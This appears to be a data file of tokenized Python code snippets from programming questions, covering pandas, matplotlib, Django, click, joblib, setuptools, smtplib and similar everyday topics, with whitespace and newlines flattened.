"d [ 'cats ' ] = 2 # I decide to make a change to my dict.d = { 'puppies ' : 4 , 'big_dogs ' : 2 } # Lots and lots of code. # ... .def change_my_dogs_to_maximum_room_capacity ( ) : # But I forgot to change this as well and there is no error to inform me . # Instead a bug was created . d [ 'dogs ' ] = 1 d = new_dict ( ) # Worksd = new_dict ( hi=1 ) # Worksd.update ( c=5 , x=2 ) # Worksd.setdefault ( ' 9 ' , 'something ' ) # Worksd [ 'a_new_key ' ] = 1 # Raises KeyError"
"try : value = cache_dict [ key ] except KeyError : value = some_api.get_the_value_via_web_service_call ( key ) cache_dict [ key ] = value Traceback ( most recent call last ) : File ... , line ... , in ... KeyError : ' ... 'During handling of the above exception , another exception occurred : Traceback ( most recent call last ) : File ... , line ... , in ... some_api.TheInterestingException : ..."
"import clickfrom myapp import Settingssettings = Settings ( ) pass_settings = click.make_pass_decorator ( Settings , ensure=True ) @ click.command ( ) @ click.help_option ( '-h ' , ' -- help ' ) @ click.option ( '-s ' , ' -- disk-size ' , default=settings.instance_disk_size , help= '' Disk size '' , show_default=True , type=int ) @ click.option ( '-t ' , ' -- disk-type ' , default=settings.instance_disk_type , help= '' Disk type '' , show_default=True , type=click.Choice ( [ 'pd-standard ' , 'pd-ssd ' ] ) ) @ pass_settingsdef create ( settings , disk_size , disk_type ) : print ( disk_size ) print ( disk_type )"
"import time from joblib import Parallel , delayed import multiprocessing array1 = [ 0 for i in range ( 100000 ) ] def myfun ( i ) : return i**2 # # # # Simple loop # # # # start_time = time.time ( ) for i in range ( 100000 ) : array1 [ i ] =i**2 print ( `` Time for simple loop -- - % s seconds -- - '' % ( time.time ( ) - start_time ) ) # # # # Parallelized loop # # # # start_time = time.time ( ) results = Parallel ( n_jobs = -1 , verbose = 0 , backend = `` threading '' ) ( map ( delayed ( myfun ) , range ( 100000 ) ) ) print ( `` Time for parallelized method -- - % s seconds -- - '' % ( time.time ( ) - start_time ) ) # # # # Output # # # # # > > > ( executing file `` Test_vr20.py '' ) # Time for simple loop -- - 0.015599966049194336 seconds -- - # Time for parallelized method -- - 7.763299942016602 seconds -- - System Model : HP ProBook 640 G2 , Windows 7 , IDLE for Python System Type : x64-based PC Processor : Intel ( R ) Core ( TM ) i5-6300U CPU @ 2.40GHz , 2401 MHz , 2 Core ( s ) , 4 Logical Processor ( s )"
"$ pip3 install -- trusted-host 172.16.1.92 -i http : //172.16.1.92:5001/simple/ < my-package > Collecting < my-package > Downloading http : //172.16.1.92:5001/packages/ < my-package > -0.2.0.zip Complete output from command python setup.py egg_info : Traceback ( most recent call last ) : File `` < string > '' , line 1 , in < module > File `` C : \Users\ < me > \AppData\Local\Temp\pip-build-ubb3jkpr\ < my-package > \setup.py '' , line 9 , in < module > import appdirs ModuleNotFoundError : No module named 'appdirs ' -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Command `` python setup.py egg_info '' failed with error code 1 in C : \Users\ < me > \AppData\Local\Temp\pip-build-ubb3jkpr\ < my-package > \ try : from setuptools import setupexcept ImportError : from distutils.core import setupimport osfrom collections import defaultdictimport appdirsfrom < my-package > .version import __version__ as < my-package > _versionAPP_NAME = ' < my-app > 'APP_AUTHOR = ' < company > 'SYSTEM_COMPONENT_PLUGIN_DIR = os.path.join ( appdirs.user_data_dir ( APP_NAME , APP_AUTHOR ) , 'components ' ) # ... setup ( # ... data_files=component_files , )"
"import datetimedt = datetime.datetime ( 2013 , 6 , 26 , 9 , 0 ) l = [ dt , dt ] template = `` { 0 : > 25 } { 1 : > 25 } '' # right justifyprint template.format ( *l ) # print items in the list using template > 25 > 25 2013-06-26 09:00:00 2013-06-26 09:00:00 print template.format ( str ( l [ 0 ] ) , str ( l [ 1 ] ) ) `` Harold 's a clever { 0 ! s } '' # Calls str ( ) on the argument first '' Bring out the holy { name ! r } '' # Calls repr ( ) on the argument first"
"# Three random combinations of [ 0,0,0 ] and [ 1,1,1 ] comb = np.array ( np.meshgrid ( [ 0,1 ] , [ 0,1 ] , [ 0,1 ] ) ) .T.reshape ( -1,3 ) result = comb [ np.random.choice ( len ( comb ) ,3 , replace=False ) , : ]"
"import smtplibimport sysfrom email.mime.text import MIMETextfrom email.mime.multipart import MIMEMultipartsender='foo @ bar.com'recipients='someguy @ bar.com'subject= ' A pretty long subject line which looks like this'mail_server='microsfot_exchange_server_ip'msg = MIMEMultipart ( 'alternative ' ) body='Body of the Email'msg [ 'Subject ' ] = subjectmsg [ 'from ' ] = sendermsg [ 'to ' ] = `` , `` .join ( recipients ) s = smtplib.SMTP ( mail_server ) s.sendmail ( sender , recipients , msg.as_string ( ) ) s.quit ( ) A pretty long subject line which looks like this"
"# ! /usr/bin/env pythonfrom distutils.core import setupcfg [ 'name ' ] = input ( `` Please your username : '' ) cfg.save ( ) setup ( name='appname ' , version= ' 1.0 ' , description='App Description ' , author='Author ' , author_email='author @ author.net ' , packages= [ 'mypackage ' ] , )"
"import matplotlib.pyplot as pltfig , ax = plt.subplots ( ) # Arrow in degree # Arrow represent the wind directiondegree= 45 # Arrow should rotate as per the specified degree , ( 0 degree is North ) # Draw Circle # CENTER POINTCircle1 = plt.Circle ( ( 5 , 5 ) , 0.1 , color='blue ' , fill=True ) ax.add_artist ( Circle1 ) # CIRCLECircle2 = plt.Circle ( ( 5 , 5 ) , 6 , color='blue ' , fill=False ) ax.add_artist ( Circle2 ) x3=5.0y3=6.8x4=5.0y4=9.0 # Wind Direction Arrow # LEFT ARROWax.annotate ( `` , xy= ( x3-0.5 , y3 ) , xycoords='data ' , xytext= ( -20 , 50 ) , textcoords='offset points ' , rotation=degree , size=20 , # bbox=dict ( boxstyle= '' round '' , fc= '' 0.8 '' ) , arrowprops=dict ( arrowstyle= '' fancy '' , fc= '' 0.6 '' , ec= '' none '' , connectionstyle= '' angle3 , angleA=0 , angleB=-90 '' ) ) # CENTER ARROWax.annotate ( `` , xy= ( x3 , y3 ) , xycoords='data ' , xytext= ( 0 , 50 ) , textcoords='offset points ' , rotation=degree , size=20 , # bbox=dict ( boxstyle= '' round '' , fc= '' 0.8 '' ) , arrowprops=dict ( arrowstyle= '' fancy '' , fc= '' 0.6 '' , ec= '' none '' , connectionstyle= '' angle3 , angleA=0 , angleB=-90 '' ) ) # RIGHT ARROWax.annotate ( `` , xy= ( x3+0.5 , y3 ) , xycoords='data ' , xytext= ( 20 , 50 ) , textcoords='offset points ' , rotation=degree , size=20 , # bbox=dict ( boxstyle= '' round '' , fc= '' 0.8 '' ) , arrowprops=dict ( arrowstyle= '' fancy '' , fc= '' 0.6 '' , ec= '' none '' , connectionstyle= '' angle3 , angleA=0 , angleB=-90 '' ) ) ax.set_aspect ( 'equal ' ) ax.set_xlim ( [ -2.5,12.5 ] ) ax.set_ylim ( [ -3,15 ] ) plt.show ( )"
"PRO hw3 4 , A , LA , LC , count ; Find all the holesAc=A EQ 0LC=label region ( Ac , /ALL ) ; Construct an array with the holes filled inAfill= ( A GT 0 ) OR ( LC GT 1 ) ; Display the arrayssa=size ( A , /dim ) window , /free , xsize=sa [ 0 ] , ysize=sa [ 1 ] tvlct , rr , gg , bb , /gettek colorTV , Afillwindow , /free , xsize=sa [ 0 ] , ysize=sa [ 1 ] TV , LC ; Count the objects with holes . First we ; find all the objects and then match up ; the object labels and the hole labels.LA=label region ( Afill ) window , /free , xsize=sa [ 0 ] , ysize=sa [ 1 ] TV , LAha=histogram ( LA ) ia=where ( ha ge 0 ) print , format= ’ ( `` Objects '' ,3x , '' Count '' , / , ( i2,5x , i7 ) ) ’ , $ [ transpose ( ia ) , transpose ( ha [ ia ] ) ] ; Each element of ia corresponds to a filled ; object . Object k is labeled ia [ k ] . For each ; object that is not background , ; determine whether it has holes.c=0printprint , '' k ia [ k ] N C '' For k=1 , n elements ( ia ) -1 DO BEGINB=bytarr ( sa [ 0 ] , sa [ 1 ] ) ; Make an array with one objectik=Where ( LA eq ia [ k ] ) ; ; Fill in the objectIF MIN ( ik ) GE 0 THEN B [ ik ] =1 ; Now see if any of the object pixels match the ; hole image LC . Counts if one or more holes.IF MAX ( B AND ( LC GT 0 ) ) GT 0 THEN c++print , [ k , ia [ k ] , n elements ( ik ) , c ] , format= ’ ( I2,1x , I2,3x , I5,2x , I1 ) ’ ENDPrint , ’ Number of objects with one or more holes= ’ , counttvlct , rr , gg , bbENDIDL > hw3 4 , A , LA , LC , count"
"array ( [ [ 6 , 5 ] , [ 6 , 9 ] , [ 7 , 5 ] , [ 7 , 9 ] , [ 8 , 10 ] , [ 9 , 10 ] , [ 9 , 11 ] , [ 10 , 10 ] ] ) array ( [ [ 6 , 5 ] , [ 6 , 9 ] , [ 8 , 10 ] , [ 9 , 11 ] ] )"
"First A B Second bar baz foo bar baz foo Third cat dog cat dog cat dog cat dog cat dog cat dog0 3 8 7 7 4 7 5 3 2 2 6 21 8 6 5 7 8 7 1 8 6 0 3 92 9 2 2 9 7 3 1 8 4 1 0 83 3 6 0 6 3 2 2 6 2 4 6 94 7 6 4 3 1 5 0 4 8 4 8 1 First A B Second bar baz foo new bar baz foo new Third cat dog cat dog cat dog cat dog cat dog cat dog cat dog cat dog0 3 8 7 7 4 7 7 15 5 3 2 2 6 2 11 51 8 6 5 7 8 7 16 13 1 8 6 0 3 9 4 172 9 2 2 9 7 3 16 5 1 8 4 1 0 8 1 163 3 6 0 6 3 2 6 8 2 6 2 4 6 9 8 154 7 6 4 3 1 5 8 11 0 4 8 4 8 1 8 5 def func ( data ) : fi = data.columns [ 0 ] [ 0 ] th = data.columns [ 0 ] [ 2 ] data [ ( fi , 'new ' , th ) ] = data [ ( fi , 'foo ' , th ) ] + data [ ( fi , 'bar ' , th ) ] print data return dataprint grouped.apply ( func ) import pandas , itertoolsfirst = [ ' A ' , ' B ' ] second = [ 'foo ' , 'bar ' , 'baz ' ] third = [ 'dog ' , 'cat ' ] tuples = [ ] for tup in itertools.product ( first , second , third ) : tuples.append ( tup ) columns = pandas.MultiIndex.from_tuples ( tuples , names= [ 'First ' , 'Second ' , 'Third ' ] ) data = np.random.randint ( 0,10 , ( 5 , 12 ) ) df = pandas.DataFrame ( data , columns=columns ) dfnew = Nonegrouped = df.groupby ( by=None , level= [ 0,2 ] , axis=1 ) for name , group in grouped : newparam = group.xs ( 'foo ' , axis=1 , level=1 ) + group.xs ( 'bar ' , axis=1 , level=1 ) dftmp = group.join ( pandas.DataFrame ( np.array ( newparam ) , columns=pandas.MultiIndex.from_tuples ( [ ( group.columns [ 0 ] [ 0 ] , 'new ' , group.columns [ 0 ] [ 2 ] ) ] , names= [ 'First ' , 'Second ' , 'Third ' ] ) ) ) if dfnew is None : dfnew = dftmp else : dfnew = pandas.concat ( [ dfnew , dftmp ] , axis=1 ) print dfnew.sort_index ( axis=1 )"
"SELECT time , value from data order by time limit 100 ; SELECT time , value from data order by time ; // make sure autocommit is offconn.setAutoCommit ( false ) ; Statement st = conn.createStatement ( ) ; // Turn use of the cursor on.st.setFetchSize ( 50 ) ;"
"class Discussion : name = models.CharField ( max_length=255 ) class Message : owner = models.ForeignKey ( User , related_name='messages ' ) body = models.TextField ( ) discussion = models.ForeignKey ( Discussion , related_name='messages ' ) class MessageApprovalVote : owner = models.ForeignKey ( User , related_name='message_approval_votes ' ) message = models.ForeignKey ( Message , related_name='approval_votes ' ) class DiscussionApprovalVote : owner = models.ForeignKey ( User , related_name='discussion_approval_votes ' ) discussion = models.ForeignKey ( Discussion , related_name='approval_votes ' ) # Does n't workDiscussion.objects . order_by ( Count ( 'messages ' ) + Count ( 'approval_votes ' ) + Count ( 'messages__approval_votes ' ) ) scores = Discussion.objects.annotate ( total_messages=Count ( 'messages ' , distinct=True ) , total_discussion_approval_votes=Count ( 'approval_votes ' , distinct=True ) , total_message_approval_votes=Count ( 'messages__approval_votes ' , distinct=True ) ) total_scores = scores.extra ( select= { 'score_total ' : 'total_messages + total_discussion_approval_votes + total_message_approval_votes ' } ) final_answer = total_scores.order_by ( '-score_total ' ) [ :20 ] DatabaseError : column `` total_messages '' does not existLINE 1 : SELECT ( total_votes + total_messages + total_persuasions ) AS ..."
"def draw_plot ( data , function , sigma_value ) : gs = gridspec.GridSpec ( 1 , 5 ) ax1 = subplot ( gs [ 0 , 0:3 ] ) ax2 = subplot ( gs [ 0 , 3:5 ] , sharey=ax1 ) gs.update ( wspace=0.05 ) ... from pylab import *import matplotlib.gridspec as gridspec Traceback ( most recent call last ) : File `` < interactive input > '' , line 1 , in < module > File `` myplot.py '' , line 105 , in draw_plot ax1 = subplot ( gs [ 0 , 0:3 ] ) File `` C : \Python32\lib\site-packages\matplotlib\pyplot.py '' , line 766 , in subplot a = fig.add_subplot ( *args , **kwargs ) File `` C : \Python32\lib\site-packages\matplotlib\figure.py '' , line 779 , in add_subplot a = subplot_class_factory ( projection_class ) ( self , *args , **kwargs ) File `` C : \Python32\lib\site-packages\matplotlib\axes.py '' , line 8380 , in __init__ self._axes_class.__init__ ( self , fig , self.figbox , **kwargs ) File `` C : \Python32\lib\site-packages\matplotlib\axes.py '' , line 467 , in __init__ self.cla ( ) File `` C : \Python32\lib\site-packages\matplotlib\axes.py '' , line 910 , in cla self._shared_y_axes.clean ( ) File `` C : \Python32\lib\site-packages\matplotlib\cbook.py '' , line 1493 , in clean for key , val in mapping.items ( ) : RuntimeError : dictionary changed size during iteration def clean ( self ) : `` '' '' Clean dead weak references from the dictionary `` '' '' mapping = self._mapping for key , val in mapping.items ( ) : if key ( ) is None : del mapping [ key ] val.remove ( key )"
"import ctypes , ioclass POINT ( ctypes.Structure ) : _fields_ = [ ( `` x '' , ctypes.c_int ) , ( `` y '' , ctypes.c_int ) ] # THIS WORKSwith open ( `` mypoints.bin '' , `` wb '' ) as f : for i in range ( 10 ) : p = POINT ( i,10-i ) print p.x , p.y f.write ( p ) # THIS FAILS with io.open ( `` mypoints.bin '' , `` wb '' ) as f : for i in range ( 10 ) : p = POINT ( i,10-i ) print p.x , p.y f.write ( p ) 0 10Traceback ( most recent call last ) : File `` D : \test.py '' , line 10 , in < module > f.write ( p ) File `` c : \Python26\lib\io.py '' , line 1070 , in write self._write_buf.extend ( b ) TypeError : 'POINT ' object is not iterable"
"def get_chunks_it ( l , n ) : `` '' '' Chunks an iterator ` l ` in size ` n ` Args : l ( Iterator [ Any ] ) : an iterator n ( int ) : size of Returns : Generator [ Any ] `` '' '' iterator = iter ( l ) for first in iterator : yield itertools.chain ( [ first ] , itertools.islice ( iterator , n - 1 ) ) async def generator ( ) : for i in range ( 0 , 10 ) : yield i await asyncio.sleep ( 1 ) async for chunk in get_chunk_it_async ( generator ( ) , 3 ) : print ( chunk )"
"class Test ( Model ) : __tablename__ = 'tests ' id = Column ( Integer , Sequence ( 'test_id_seq ' ) , primary_key=True ) ... Atest_id = Column ( Integer , ForeignKey ( 'Atests.id ' ) , nullable=True ) Btest_id = Column ( Integer , ForeignKey ( 'Btests.id ' ) , nullable=True ) Ctest_id = Column ( Integer , ForeignKey ( 'Ctests.id ' ) , nullable=True ) Dtest_id = Column ( Integer , ForeignKey ( 'Dtests.id ' ) , nullable=True ) Etest_id = Column ( Integer , ForeignKey ( 'Etests.id ' ) , nullable=True ) ... date = Column ( DateTime ) status = Column ( String ( 20 ) ) # pass , fail , needs_review"
"def render ( self , notification ) : `` '' '' @ type notification : Notification `` '' '' return NotificationRepresentation ( notification ) .to_dict ( ) # some irrelevant code STATICA_HACK = Trueglobals ( ) [ 'kcah_acitats ' [ : :-1 ] .upper ( ) ] = Falseif STATICA_HACK : # This is never executed , but tricks static analyzers ( PyDev , PyCharm , # pylint , etc . ) into knowing the types of these symbols , and what # they contain . from celery.canvas import group , chord , subtask from .base import BaseTask , Task , PeriodicTask , task , periodic_task from .sets import TaskSet"
def outerfunc ( ) : def innerfunc ( ) : do_something ( ) return innerfunc ( )
"class _mystring ( object ) : __metaclass__ = abc.ABCMeta @ abc.abstractproperty def str ( self ) : pass @ str.setter def str ( self , value ) : self._str = valueclass uppercase ( _mystring ) : @ _mystring.str.getter def str ( self ) : return self._str.upper ( )"
"cdef cppclass point : float x , y point ( ) : this.x = 0 this.y = 0 float sum ( ) : return this.x + this.y float sum ( int z ) : # COMPILE ERROR return this.x + this.y + z cdef cppclass point : float x , y point ( ) : this.x = 0 this.y = 0 point ( float X , float Y ) : # COMPILE ERROR this.x = X this.y = Y float sum ( ) : return this.x + this.y cdef cppclass point : float x , y point ( float X=0 , float Y=0 ) : this.x = X this.y = Y float sum ( ) : return this.x + this.ycdef float use_point ( ) : cdef point p p = point ( 1 , 2 ) return p.sum ( )"
"def serve_preview ( self , request , mode_name ) : from wagtail.api.v2.endpoints import PagesAPIEndpoint endpoint = PagesAPIEndpoint ( ) setattr ( request , 'wagtailapi_router ' , WagtailAPIRouter ( 'wagtailapi_v2 ' ) ) endpoint.request = request endpoint.action = None endpoint.kwargs = { 'slug ' : self.slug , 'pk ' : self.pk } endpoint.lookup_field = 'pk ' serializer = endpoint.get_serializer ( self ) def serve_preview ( self , request , mode_name ) : from wagtail.api.v2.endpoints import PagesAPIEndpoint fields = PagesAPIEndpoint.get_available_fields ( self ) if hasattr ( self , 'api_fields ' ) : fields.extend ( self.api_fields ) serializer_class = get_serializer_class ( type ( self ) , fields , meta_fields= [ PagesAPIEndpoint.meta_fields ] , base=PageSerializer ) serializer = serializer_class ( self ) Traceback ( most recent call last ) : ... File `` /usr/local/lib/python3.5/site-packages/wagtail/api/v2/serializers.py '' , line 92 , in to_representation self.context [ 'view ' ] .seen_types [ name ] = page.specific_class KeyError : 'view '"
def __init__ ( self ) : rc.open ( ) def __del__ ( self ) : rc.close ( )
try : output_var = some_magical_function ( ) except IntegrityError as zde : integrity_error_handling ( ) shared_exception_handling_function ( zde ) # could be error reportingexcept SomeOtherException as soe : shared_exception_handling_function ( soe ) # the same function as above try : output_var = some_magical_function ( ) except IntegrityError as zde : integrity_error_handling ( ) except ALLExceptions as ae : # all exceptions INCLUDING the IntregityError shared_exception_handling_function ( ae ) # could be error reporting
"import unittestimport testtoolsclass MyTester ( unittest.TestCase ) : # Tests ... suite = unittest.TestLoader ( ) .loadTestsFromTestCase ( MyTester ) concurrent_suite = testtools.ConcurrentStreamTestSuite ( lambda : ( ( case , None ) for case in suite ) ) concurrent_suite.run ( testtools.StreamResult ( ) )"
"setup ( # ... basic data here ... requires= [ 'pytz ( > =2012f ) ' , ] , # ... some other data here ... ) Traceback ( most recent call last ) : File `` setup.py '' , line 25 , in < module > long_description=long_description , File `` /usr/lib/python2.7/distutils/core.py '' , line 112 , in setup _setup_distribution = dist = klass ( attrs ) File `` /usr/lib/python2.7/distutils/dist.py '' , line 259 , in __init__ getattr ( self.metadata , `` set_ '' + key ) ( val ) File `` /usr/lib/python2.7/distutils/dist.py '' , line 1220 , in set_requires distutils.versionpredicate.VersionPredicate ( v ) File `` /usr/lib/python2.7/distutils/versionpredicate.py '' , line 115 , in __init__ self.pred = [ splitUp ( aPred ) for aPred in str.split ( `` , '' ) ] File `` /usr/lib/python2.7/distutils/versionpredicate.py '' , line 25 , in splitUp return ( comp , distutils.version.StrictVersion ( verStr ) ) File `` /usr/lib/python2.7/distutils/version.py '' , line 40 , in __init__ self.parse ( vstring ) File `` /usr/lib/python2.7/distutils/version.py '' , line 107 , in parse raise ValueError , `` invalid version number ' % s ' '' % vstringValueError : invalid version number '2012f ' version_re = re.compile ( r'^ ( \d+ ) \ . ( \d+ ) ( \ . ( \d+ ) ) ? ( [ ab ] ( \d+ ) ) ? $ ' , re.VERBOSE )"
"import timeit def test ( module ) : t1 = timeit.timeit ( `` import { } '' .format ( module ) ) t2 = timeit.timeit ( `` { 0 } = __import__ ( ' { 0 } ' ) '' .format ( module ) ) print ( `` import statement : `` , t1 ) print ( `` __import__ function : '' , t2 ) print ( `` t ( statement ) { } t ( function ) '' .format ( `` < `` if t1 < t2 else `` > '' ) ) > > > test ( 'sys ' ) import statement : 0.319865173171288__import__ function : 0.38428380458522987t ( statement ) < t ( function ) > > > test ( 'math ' ) import statement : 0.10262547545597034__import__ function : 0.16307580163101054t ( statement ) < t ( function ) > > > test ( 'os ' ) import statement : 0.10251490255312312__import__ function : 0.16240755669640627t ( statement ) < t ( function ) > > > test ( 'threading ' ) import statement : 0.11349136644972191__import__ function : 0.1673617034957573t ( statement ) < t ( function ) > > > test ( 'numpy ' ) import statement : 0.18907936340054476__import__ function : 0.15840019037769792t ( statement ) > t ( function ) > > > test ( 'tkinter ' ) import statement : 0.3798560809537861__import__ function : 0.15899962771786136t ( statement ) > t ( function ) > > > test ( `` pygame '' ) import statement : 0.6624641952621317__import__ function : 0.16268579177259568t ( statement ) > t ( function )"
sub foo ( ) { state $ x = 1 ; say $ x++ ; } foo ( ) ; foo ( ) ; foo ( ) ; 123
"import stringdelete_table = string.maketrans ( string.ascii_lowercase , ' ' * len ( string.ascii_lowercase ) ) table = string.maketrans ( `` , `` ) '' Agh # $ % # % 2341- - ! zdrkfd '' .translate ( table , delete_table ) 'ghzdrkfd '"
444 PARK GARDEN LN number : 444street : PARK GARDENsuffix : LN from pyparsing import *def main ( ) : street_number = Word ( nums ) .setResultsName ( 'street_number ' ) street_suffix = oneOf ( `` ST RD DR LN AVE WAY '' ) .setResultsName ( 'street_suffix ' ) street_name = OneOrMore ( Word ( alphas ) ) .setResultsName ( 'street_name ' ) address = street_number + street_name + street_suffix result = address.parseString ( `` 444 PARK GARDEN LN '' ) print result.dump ( ) if __name__ == '__main__ ' : main ( )
"Q_theta = sympy.polys.domains.AlgebraicField ( QQ , theta )"
< html > < body > < h1 > First section < /h1 > < p > Lorem ipsum ... < /p > < p > Lorem ipsum ... < /p > < p > Lorem ipsum ... < /p > < p > Lorem ipsum ... < /p > < p style= '' break-after : always ; '' > < /p > < p > Lorem ipsum ... < /p > < /body > < /html >
"openmode = IS_PY2 and ' w ' or 'wt'openkwargs = IS_PY2 and { } or { 'encoding ' : 'utf-8 ' , 'newline ' : `` }"
"import pandas as pddf_dict = { ' a ' : { `` 1 '' : `` stuff '' , `` 2 '' : `` stuff2 '' } , `` d '' : { `` 1 '' : [ ( 1 , 2 ) , ( 3 , 4 ) ] , `` 2 '' : [ ( 1 , 2 ) , ( 3 , 4 ) ] } } df = pd.DataFrame.from_dict ( df_dict ) print ( df ) # intial structure a d 1 stuff [ ( 1 , 2 ) , ( 3 , 4 ) ] 2 stuff2 [ ( 1 , 2 ) , ( 3 , 4 ) ] # first transformation , let 's separate each list item into a new rowrow_breakdown = df.set_index ( [ `` a '' ] ) [ `` d '' ] .apply ( pd.Series ) .stack ( ) print ( row_breakdown ) a stuff 0 ( 1 , 2 ) 1 ( 3 , 4 ) stuff2 0 ( 1 , 2 ) 1 ( 3 , 4 ) dtype : objectrow_breakdown = row_breakdown.reset_index ( ) .drop ( columns= [ `` level_1 '' ] ) print ( row_breakdown ) a 0 0 stuff ( 1 , 2 ) 1 stuff ( 3 , 4 ) 2 stuff2 ( 1 , 2 ) 3 stuff2 ( 3 , 4 ) # second transformation , let 's get each tuple item into a separate columnrow_breakdown.columns = [ `` a '' , `` d '' ] row_breakdown = row_breakdown [ `` d '' ] .apply ( pd.Series ) row_breakdown.columns = [ `` value_1 '' , `` value_2 '' ] print ( row_breakdown ) value_1 value_2 0 1 2 1 3 4 2 1 2 3 3 4 from pyspark.context import SparkContext , SparkConffrom pyspark.sql.session import SparkSessionconf = SparkConf ( ) .setAppName ( `` appName '' ) .setMaster ( `` local '' ) sc = SparkContext ( conf=conf ) spark = SparkSession ( sc ) df_dict = { ' a ' : { `` 1 '' : `` stuff '' , `` 2 '' : `` stuff2 '' } , `` d '' : { `` 1 '' : [ ( 1 , 2 ) , ( 3 , 4 ) ] , `` 2 '' : [ ( 1 , 2 ) , ( 3 , 4 ) ] } } df = pd.DataFrame ( df_dict ) ddf = spark.createDataFrame ( df ) row_breakdown = ddf.set_index ( [ `` a '' ] ) [ `` d '' ] .apply ( pd.Series ) .stack ( ) AttributeError : 'DataFrame ' object has no attribute 'set_index '"
"for line in filter ( fh ) : a , b , c , d = line.split ( )"
"def get_bigrams ( string ) : `` '' '' Take a string and return a list of bigrams. `` '' '' s = string.lower ( ) return [ s [ i : i+2 ] for i in list ( range ( len ( s ) - 1 ) ) ] def string_similarity ( str1 , str2 ) : `` '' '' Perform bigram comparison between two strings and return a percentage match in decimal form. `` '' '' pairs1 = get_bigrams ( str1 ) pairs2 = get_bigrams ( str2 ) union = len ( pairs1 ) + len ( pairs2 ) hit_count = 0 for x in pairs1 : for y in pairs2 : if x == y : hit_count += 1 break return ( 2.0 * hit_count ) / union"
"input_data = tf.placeholder ( tf.float32 , [ batch_size , len_seq,8 ] ) input_single = tf.placeholder ( tf.float32 , [ 1 , 1 , 8 ] ) action_gradient = tf.placeholder ( tf.float32 , [ batch_size , len_seq , dimAction ] ) num_hidden = 24 cell = tf.nn.rnn_cell.LSTMCell ( num_hidden , state_is_tuple=True ) state_single = cell.zero_state ( batch_size , tf.float32 ) ( output_single , state_single ) = cell ( input_single , state_single ) weight = tf.Variable ( tf.truncated_normal ( [ num_hidden , dimAction ] ) ) bias = tf.Variable ( tf.constant ( 0.1 , shape= [ dimAction ] ) ) y_single = tf.nn.tanh ( tf.matmul ( output_single , weight ) + bias ) outputs , states = tf.nn.dynamic_rnn ( cell , input_data , dtype=tf.float32 ) y_seq = tf.nn.tanh ( tf.matmul ( outputs , weight ) + bias )"
"import subprocess as spdef run ( command , description ) : `` '' '' Runs a command in a formatted manner . Returns its return code . '' '' '' start=datetime.datetime.now ( ) sys.stderr.write ( ' % -65s ' % description ) s=sp.Popen ( command , shell=True , stderr=sp.PIPE , stdout=sp.PIPE ) out , err=s.communicate ( ) end=datetime.datetime.now ( ) duration=end-start status='Done ' if s.returncode==0 else 'Failed ' print ' % s ( % d seconds ) ' % ( status , duration.seconds ) s=sp.Popen ( command , shell=True , stderr=sp.PIPE , stdout=sp.PIPE ) out , err=s.communicate ( ) [ STDOUT : 2011-01-17 14:53:55 ] < message > [ STDERR : 2011-01-17 14:53:56 ] < message > # ! /usr/bin/pythonimport syssys.stdout.write ( 'OUT\n ' ) sys.stdout.flush ( ) sys.stderr.write ( 'ERR\n ' ) sys.stderr.flush ( )"
"class Descr_df ( object ) : def transform ( self , X ) : print ( `` Structure of the data : \n { } '' .format ( X.head ( 5 ) ) ) print ( `` Features names : \n { } '' .format ( X.columns ) ) print ( `` Target : \n { } '' .format ( X.columns [ 0 ] ) ) print ( `` Shape of the data : \n { } '' .format ( X.shape ) ) def fit ( self , X , y=None ) : return selfclass Fillna ( object ) : def transform ( self , X ) : non_numerics_columns = X.columns.difference ( X._get_numeric_data ( ) .columns ) for column in X.columns : if column in non_numerics_columns : X [ column ] = X [ column ] .fillna ( df [ column ] .value_counts ( ) .idxmax ( ) ) else : X [ column ] = X [ column ] .fillna ( X [ column ] .mean ( ) ) return X def fit ( self , X , y=None ) : return selfclass Categorical_to_numerical ( object ) : def transform ( self , X ) : non_numerics_columns = X.columns.difference ( X._get_numeric_data ( ) .columns ) le = LabelEncoder ( ) for column in non_numerics_columns : X [ column ] = X [ column ] .fillna ( X [ column ] .value_counts ( ) .idxmax ( ) ) le.fit ( X [ column ] ) X [ column ] = le.transform ( X [ column ] ) .astype ( int ) return X def fit ( self , X , y=None ) : return self pipeline = Pipeline ( [ ( 'df_intropesction ' , Descr_df ( ) ) , ( 'fillna ' , Fillna ( ) ) , ( 'Categorical_to_numerical ' , Categorical_to_numerical ( ) ) ] ) pipeline.fit ( X , y ) AttributeError : 'NoneType ' object has no attribute 'columns '"
def even ( k ) : for i in range ( k ) : if ( i % 2 ) : yield keven_list = [ ] for i in even ( 100 ) : even_list.append ( i ) def even ( k ) : evens_list = [ ] for i in range ( k ) : if ( i % 2 ) : evens_list.append ( i ) return evens_list
"import matplotlib.pyplot as pltimport numpy as np # Generate random data . x1 = np.random.randn ( 50 ) y1 = np.linspace ( 0 , 1 , 50 ) x2 = np.random.randn ( 20 ) +15.y2 = np.linspace ( 10 , 20 , 20 ) # Plot both curves.fig = plt.figure ( ) ax1 = fig.add_subplot ( 111 ) ax1.set_xlabel ( 'x_1 ' ) ax1.set_ylabel ( 'y_1 ' ) plt.plot ( x1 , y1 , c= ' r ' ) ax2 = ax1.twinx ( ) .twiny ( ) ax2.set_xlabel ( 'x_2 ' ) ax2.set_ylabel ( 'y_2 ' ) plt.ylim ( min ( y2 ) , max ( y2 ) ) ax2.plot ( x2 , y2 , c= ' b ' ) plt.show ( ) ax2 = ax1.twinx ( ) .twiny ( ) ax2 = ax1.twiny ( ) .twinx ( )"
"from pymake import task , main @ task ( 'reset_tables ' , 'Drop and recreate all MySQL tables ' ) def reset_tables ( ) : # ... @ task ( 'build_stylus ' , 'Build the stylus files to public/css/* ' ) def build_stylus ( ) : from myproject import stylus_builder # ... @ task ( 'build_cscript ' , 'Build the coffee-script files to public/js/* ' ) def build_cscript ( ) : # ... @ task ( 'build ' , 'Build everything buildable ' ) def build ( ) : build_cscript ( ) build_stylus ( ) # etc ... # Function that parses command line args etc ... main ( )"
